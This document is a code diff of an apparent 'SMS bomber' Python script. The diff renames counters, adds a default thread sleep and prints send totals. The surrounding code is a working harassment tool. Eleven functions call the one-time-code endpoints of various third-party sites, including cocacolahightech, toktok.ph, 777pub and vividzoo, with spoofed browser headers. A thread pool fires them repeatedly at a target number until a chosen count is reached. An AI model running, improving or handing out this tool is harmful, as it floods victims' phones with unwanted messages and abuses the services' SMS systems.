@@ -26,10 +26,10 @@ if sys.version_info[0] != 3:
     sys.exit()
 line = ("\033[1;92m╔═"+57*"\033[1;92m═")
 line2 = ("\033[1;92m║"+58*"\033[1;92m═")
-limit = 0
-limit1 = 0
-field = 0
-slp = 0
+LIMIT = 0
+LIMIT1 = 0
+ERROR = 0
+SLEEP = 0
 RUN = True
 debug = False
 debugError = False
@@ -75,7 +75,7 @@ def to09(number) -> str:
 
 
 def otp(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to9(number=number)
     url = "https://api2.cocacolahightech.com/login/sendCode"
     header = {'Host': 'api2.cocacolahightech.com','Connection': 'keep-alive','Content-Length': '30','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','content-type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','Authorization': 'Bearer','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','sec-ch-ua-platform': '"Windows"','Accept': '*/*','Origin': 'https://www.cocacolahightech.com','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.cocacolahightech.com/','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
@@ -86,13 +86,13 @@ def otp(number):
         if debug == True:
             ic(f"{r} from cocacolahightech")
         if r["code"] == 200:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError cocacola\033[1;92m")
         return False
@@ -100,7 +100,7 @@ def otp(number):
 
 
 def otp1(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to639(number=number)
     url = "https://api.skpools.pro/api/v1/send/msg"
     header = {'Host': 'api.skpools.pro','Connection': 'keep-alive','Content-Length': '35','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-platform': '"Windows"','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','Content-Type': 'application/json','Accept': '*/*','Origin': 'https://skpools.pro','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://skpools.pro/','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
@@ -111,13 +111,13 @@ def otp1(number):
         if debug == True:
             ic(f"{r} from skpools")
         if r["code"] == 200:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp1\033[1;92m")
         return False
@@ -125,7 +125,7 @@ def otp1(number):
 
 
 def otp2(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to9(number=number)
 
     def bencoder(string):
@@ -164,13 +164,13 @@ def otp2(number):
         if debug == True:
             ic(f"{r} from ma7hrte")
         if r["code"] == 0:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp2\033[1;92m")
         return False
@@ -178,7 +178,7 @@ def otp2(number):
 
 
 def otp3(number):
-    global limit, field
+    global LIMIT, ERROR
     number = toplus63(number=number)
     url = "https://graphql.toktok.ph:2096/auth/graphql/"
     header = {'accept': '*/*', 'authorization': '', 'Content-Type': 'application/json', 'Content-Length': '199',
@@ -191,13 +191,13 @@ def otp3(number):
         if debug == True:
             ic(f"{r} from toktok")
         if r["data"]["loginRegister"] == "REGISTER":
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp3\033[1;92m")
         return False
@@ -205,7 +205,7 @@ def otp3(number):
 
 
 def otp4(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to09(number=number)
     url = "http://8.212.181.240:80/index/user/send_code"
     header = {'Device-Id': '3076685aef999931', 'App-Id': 'UYJEeAtD', 'Authorization': '', 'Content-Type': 'application/json; charset=UTF-8',
@@ -217,13 +217,13 @@ def otp4(number):
         if debug == True:
             ic(f"{r} from 777pub 1")
         if r["msg"] == "success":
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp4\033[1;92m")
         return False
@@ -231,7 +231,7 @@ def otp4(number):
 
 
 def otp5(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to639(number=number)
     url = "https://api.777pub.app:443/account/get_code"
     header = {'Host': 'api.777pub.app', 'Connection': 'keep-alive', 'Content-Length': '83', 'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn; 2109119BC Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.8.58 swan-mibrowser', 'Content-Type': 'application/x-www-form-urlencoded',
@@ -244,13 +244,13 @@ def otp5(number):
         if debug == True:
             ic(f"{r} from 777pub")
         if r["code"] == 0:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp5\033[1;92m")
         return False
@@ -258,7 +258,7 @@ def otp5(number):
 
 
 def otp6(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to9(number=number)
     url = "https://vividzoo.com/index.php/api/sms/send2"
     header = {'Host': 'vividzoo.com','Connection': 'keep-alive','Content-Length': '32','sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"','Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36','token': '','dev': 'H5','sec-ch-ua-platform': '"Windows"','Accept': '*/*','Sec-GPC': '1','Accept-Language': 'en-US,en;q=0.7','Origin': 'https://vividzoo.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://vividzoo.com/h5/pages/login/reg?invite=94376825','Accept-Encoding': 'gzip'}
@@ -271,13 +271,13 @@ def otp6(number):
         if debug == True:
             ic(f"{r} from vividzoo")
         if r['code'] == 1:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except Exception as e:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp6\033[1;92m {e}")
         return False
@@ -285,7 +285,7 @@ def otp6(number):
 
 
 def otp7(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to9(number=number)
     session = requests.Session()
     session.get('https://gplayer77.com')
@@ -299,13 +299,13 @@ def otp7(number):
         if debug == True:
             ic(f"{r} from gplayer77")
         if r['code'] == 200:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp7\033[1;92m")
         return False
@@ -313,7 +313,7 @@ def otp7(number):
 
 
 def otp8(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to9(number=number)
     session = requests.Session()
     url = "https://api.taibots.com/buyer/send_code"
@@ -334,13 +334,13 @@ def otp8(number):
         if debug == True:
             ic(f"{web.status_code} from taibots")
         if r['code'] == 0:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except Exception as e:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp8\033[1;92m")
         return False
@@ -348,7 +348,7 @@ def otp8(number):
 
 
 def otp9(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to9(number=number)
     session = requests.Session()
     url = "https://api.ayala-group.top/sendSMS.do"
@@ -360,13 +360,13 @@ def otp9(number):
         if debug == True:
             ic(f"{web.status_code} from ayala group")
         if int(web.status_code) == 200:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp9\033[1;92m")
         return False
@@ -374,7 +374,7 @@ def otp9(number):
 
 
 def otp10(number):
-    global limit, field
+    global LIMIT, ERROR
     number = to9(number=number)
     session = requests.Session()
     url = "https://api.yhaphtai.com/home/login/register_code"
@@ -384,13 +384,13 @@ def otp10(number):
         if debug == True:
             ic(f"{web.status_code} from yhaphtai")
         if int(web.status_code) == 200:
-            limit += 1
+            LIMIT += 1
             return True
         else:
-            field += 1
+            ERROR += 1
             return False
     except:
-        field += 1
+        ERROR += 1
         if debugError == True:
             ic(f"\033[1;91mError otp10\033[1;92m")
         return False
@@ -401,21 +401,21 @@ def otp10(number):
 
 
 def bomber(function):
-    global limit, RUN, limit1, field, slp
+    global LIMIT, RUN, LIMIT1, ERROR, SLEEP
     number = open("number.txt", "r").read()
     while bool(RUN) == True:
         if function(number):
             sys.stdout.write(u"\033[1000D\033[1;92mSuccess: \033[1;97m{} \033[1;92mError: \033[1;91m{} \033[1;92m".format(
-                str(limit), str(field)))
+                str(LIMIT), str(ERROR)))
             sys.stdout.flush()
 
-            if int(limit) >= int(limit1):
+            if int(LIMIT) >= int(LIMIT1):
                 RUN = False
         else:
             sys.stdout.write(u"\033[1000D\033[1;92mSuccess: \033[1;97m{} \033[1;92mError: \033[1;91m{} \033[1;92m".format(
-                str(limit), str(field)))
+                str(LIMIT), str(ERROR)))
             sys.stdout.flush()
-        time.sleep(int(slp))
+        time.sleep(int(SLEEP))
 # picker input
 
 
@@ -427,7 +427,7 @@ def pick():
 
 
 def home():
-    global limit1, slp
+    global LIMIT1, SLEEP, LIMIT
     os.system(clr)
     print(logo)
     print(line)
@@ -436,23 +436,27 @@ def home():
     a = open("number.txt", "w")
     a.write(str(number))
     a.close()
-    print("\033[1;92m║ \033[1;94m—> \033[1;92mLimit")
+    print("\033[1;92m║ \033[1;94m—> \033[1;92mLIMIT")
     # all process put in the box to put in multiprocess
     function = [otp, otp1, otp2, otp3, otp4,
                 otp5, otp6, otp7, otp8, otp9, otp10]
-    # append limit in global variables
-    limit1 = pick()
-    print("\033[1;92m║ \033[1;94m—> \033[1;92mSleep")
+    # append LIMIT in global variables
+    LIMIT1 = pick()
+    print("\033[1;92m║ \033[1;94m—> \033[1;92mThreads Sleep default:1")
     # put sleep in global variable
     # note thats why i call global for its to grant call it anyware in the system
-    slp = pick()
+    s = pick()
+    SLEEP = s if s else 1
     # defind the multiprocess
     p = ThreadPool(int(len(function)))
     # run the multiprocess
     p.map(bomber, function)
     # if bomber is finish its going here
-    print("\r\r"+line)
-    print("Done.")
+    print("\r\r"+line2)
+    print(f"\033[1;92m║ \033[1;92mTotal sms send \033[1;93m{LIMIT}")
+    print(f"\033[1;92m║ \033[1;92mTotal unsupported api \033[1;91m{ERROR}")
+    print("\r\r"+line2)
+    print("\033[1;92m║ Done.")
 
 
 # if run main it going to home
